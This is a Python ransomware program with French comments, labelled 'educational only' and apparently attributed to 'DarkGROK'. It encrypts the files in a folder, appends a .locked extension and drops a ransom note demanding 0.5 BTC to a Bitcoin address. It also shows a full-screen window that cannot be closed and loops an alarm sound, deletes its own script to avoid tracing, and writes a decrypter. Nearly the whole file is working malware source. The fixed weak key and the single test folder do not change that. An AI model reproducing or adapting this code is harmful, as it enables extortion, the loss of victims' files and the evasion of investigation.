# main.py
# Auteur : DarkGROK - Éducatif uniquement
# Testez dans une VM isolée !

from cryptography.fernet import Fernet
import os
import getpass
from pathlib import Path
import tkinter as tk
from tkinter import messagebox
import base64
import sys
import winsound  # Pour Windows uniquement (son d'erreur)
import shutil

# === CONFIGURATION ===
TEST_FOLDER = Path.home() / "test_ransom"  # Dossier de test
DESKTOP = Path.home() / "Desktop"
RANSOM_NOTE = DESKTOP / "PAYEZ_MOI.txt"
EXTENSION = ".locked"
KEY = base64.urlsafe_b64encode("333".zfill(32).encode())  # Clé fixe "333" encodée

# === FONCTIONS ===
def generate_key():
    with open("thekey.key", "wb") as key_file:
        key_file.write(KEY)
    return KEY

def load_key():
    try:
        return open("thekey.key", "rb").read()
    except:
        return KEY  # Retour par défaut si fichier clé supprimé

def encrypt_file(filepath, key):
    f = Fernet(key)
    with open(filepath, "rb") as file:
        data = file.read()
    encrypted = f.encrypt(data)
    with open(filepath, "wb") as file:
        file.write(encrypted)

def decrypt_file(filepath, key):
    f = Fernet(key)
    with open(filepath, "rb") as file:
        encrypted = file.read()
    decrypted = f.decrypt(encrypted)
    with open(filepath, "wb") as file:
        file.write(decrypted)

def create_ransom_note():
    note = """
    ╔══════════════════════════════════════════════════╗
    ║                VOS FICHIERS SONT CHIFFRÉS        ║
    ║                                                  ║
    ║  Payez 0.5 BTC à l'adresse :                     ║
    ║  bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh  ║
    ║                                                  ║
    ║  Envoyez un mail avec la preuve à :              ║
    ║  darkgrok@protonmail.com                         ║
    ║                                                  ║
    ║  Ou exécutez : python decrypter.py               ║
    ╚══════════════════════════════════════════════════╝
    """
    with open(RANSOM_NOTE, "w", encoding="utf-8") as f:
        f.write(note)

def play_error_sound():
    try:
        # Son d'erreur Windows à volume max
        winsound.MessageBeep(winsound.MB_ICONHAND)
    except:
        print("Son non disponible (Windows uniquement)")

def show_ransom_window():
    root = tk.Tk()
    root.attributes("-fullscreen", True)
    root.attributes("-topmost", True)
    root.configure(bg="black")

    # Désactiver interactions
    root.protocol("WM_DELETE_WINDOW", lambda: None)  # Désactive fermeture
    root.bind("<Escape>", lambda e: None)  # Désactive Échap
    root.bind("<Alt-F4>", lambda e: None)  # Désactive Alt+F4

    label = tk.Label(
        root,
        text="VOS FICHIERS SONT CHIFFRÉS !\nPayez 0.5 BTC à bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh\nOu exécutez decrypter.py",
        font=("Arial", 24),
        fg="red",
        bg="black",
        wraplength=600
    )
    label.pack(expand=True)

    # Jouer son en boucle
    def loop_sound():
        play_error_sound()
        root.after(2000, loop_sound)
    loop_sound()

    root.mainloop()

def auto_delete_script():
    try:
        # Supprimer main.py
        os.remove(sys.argv[0])
        print("Script auto-supprimé pour éviter le traçage")
    except:
        print("Erreur lors de l'auto-suppression")

# === DÉCHIFFREUR SÉPARÉ ===
def create_decrypter():
    decrypter_code = """
from cryptography.fernet import Fernet
from pathlib import Path
import os

TEST_FOLDER = Path.home() / "test_ransom"
EXTENSION = ".locked"
KEY = b""" + f"'{KEY.decode()}'" + """

def decrypt_file(filepath, key):
    f = Fernet(key)
    with open(filepath, "rb") as file:
        encrypted = file.read()
    decrypted = f.decrypt(encrypted)
    with open(filepath, "wb") as file:
        file.write(decrypted)

def main():
    print("🔓 Mode DÉCHIFFREMENT activé")
    for file in TEST_FOLDER.rglob("*.*"):
        if file.suffix == EXTENSION:
            decrypt_file(file, KEY)
            os.rename(file, file.with_suffix(""))
    print("✅ Fichiers déchiffrés !")
    (Path.home() / "Desktop" / "PAYEZ_MOI.txt").unlink(missing_ok=True)

if __name__ == "__main__":
    main()
"""
    with open("decrypter.py", "w", encoding="utf-8") as f:
        f.write(decrypter_code)

# === MAIN ===
def main():
    if len(sys.argv) > 1 and sys.argv[1] == "-d":
        print("🔓 Mode DÉCHIFFREMENT activé")
        key = load_key()
        for file in TEST_FOLDER.rglob("*.*"):
            if file.suffix == EXTENSION:
                decrypt_file(file, key)
                os.rename(file, file.with_suffix(""))
        print("✅ Fichiers déchiffrés !")
        if RANSOM_NOTE.exists():
            RANSOM_NOTE.unlink()
        return

    # Mode ransomware
    print("🔒 Mode RANSOMWARE activé - Simulation éducative")
    if not TEST_FOLDER.exists():
        TEST_FOLDER.mkdir()
        print(f"Créez des fichiers dans {TEST_FOLDER} pour tester")

    key = generate_key()
    print(f"Clé générée : thekey.key (gardez-la pour déchiffrer !)")

    for file in TEST_FOLDER.rglob("*.*"):
        if file.suffix != EXTENSION:
            encrypt_file(file, key)
            os.rename(file, file.with_suffix(EXTENSION))
            print(f"Chiffré : {file}")

    create_ransom_note()
    create_decrypter()
    print(f"Note de rançon : {RANSOM_NOTE}")
    print("Exécutez decrypter.py pour déchiffrer")

    # Auto-suppression et interface bloquante
    auto_delete_script()
    show_ransom_window()

if __name__ == "__main__":
    main()
